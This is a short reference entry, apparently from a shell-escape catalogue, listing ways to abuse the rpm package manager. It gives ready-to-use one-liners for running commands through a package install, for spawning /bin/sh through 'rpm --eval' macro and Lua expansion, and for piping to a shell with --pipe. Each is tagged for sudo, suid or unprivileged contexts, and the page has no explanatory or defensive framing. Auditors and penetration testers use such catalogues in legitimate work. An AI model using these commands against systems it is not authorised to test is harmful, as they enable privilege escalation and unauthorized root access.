title: rpm
html:
rpm

Command Execution

Context: sudo

rpm -ivh x-1.0-1.noarch.rpm

Inherit

Context: sudo, suid, unprivileged

rpm --eval '%{lua:...}'

Shell

Context: sudo, suid, unprivileged

rpm --eval '%(/bin/sh 1>&2)'

Context: sudo, suid, unprivileged

rpm --pipe '/bin/sh 0<&1'
